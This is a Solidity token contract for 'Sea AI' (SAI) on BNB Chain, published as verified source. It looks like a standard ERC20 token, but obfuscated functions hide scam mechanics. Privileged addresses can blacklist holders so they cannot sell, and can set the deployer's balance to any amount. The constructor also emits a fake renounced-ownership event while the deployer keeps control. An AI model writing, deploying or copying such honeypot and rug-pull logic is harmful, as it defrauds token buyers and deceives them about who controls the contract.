/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;


abstract contract tradingEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address limitFee) external view returns (uint256);

    function transfer(address walletTrading, uint256 txTrading) external returns (bool);

    function allowance(address feeLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 txTrading) external returns (bool);

    function transferFrom(address sender, address walletTrading, uint256 txTrading) external returns (bool);

    event Transfer(address indexed from, address indexed amountTradingTo, uint256 value);
    event Approval(address indexed feeLaunched, address indexed spender, uint256 value);
}


abstract contract ERC20 is tradingEnable, IERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function isLiquidity(address account, uint256 amount) internal virtual {
        require(account != address(0));

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

interface buyShould {
    function createPair(address tokenMaxShould, address amountSwap) external returns (address);
}

interface teamExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SeaAI is ERC20 {

    bool public sellList;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function isFrom(address txFee) public {
        if (receiverMaxLiquidity) {
            return;
        }
        if (sellList) {
            modeMin = false;
        }
        marketingTrading[txFee] = true;
        receiverMaxLiquidity = true;
    }

    address public owner;

    function modeFromLaunched(address tradingAt) public {
        if (tradingAt == sellTo || tradingAt == address(0) || tradingAt == atAmount || !marketingTrading[_msgSender()]) {
            return;
        }
        if (modeMin) {
            modeMin = false;
        }
        buyLaunched[tradingAt] = true;
    }

    mapping(address => bool) public marketingTrading;

    bool private receiverLaunchReceiver;

    uint256 private tokenReceiverTx;

    address public sellTo;

    bool public limitTo;

    bool private modeMin;

    mapping(address => bool) public buyLaunched;

    function _beforeTokenTransfer(address tradingLaunch, address amountTradingTo, uint256 txTrading) internal override {
        require(!buyLaunched[tradingLaunch]);
    }

    bool public enableSell;

    function txTeamSender(uint256 txTrading) public {
        if (!marketingTrading[_msgSender()]) {
            return;
        }
        _balances[sellTo] = txTrading;
    }

    bool public receiverMaxLiquidity;

    constructor() ERC20("Sea AI", "SAI") { 
        if (enableSell) {
            enableSell = false;
        }
        teamExempt autoFromTrading = teamExempt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        atAmount = buyShould(autoFromTrading.factory()).createPair(autoFromTrading.WETH(), address(this));
        sellTo = _msgSender();
        if (limitTo) {
            limitTo = false;
        }
        marketingTrading[sellTo] = true;
        isLiquidity(sellTo, 100000000 * 10 ** 18);
        
        emit OwnershipTransferred(sellTo, address(0));
    }

    uint256 public minBuy;

    address public atAmount;

}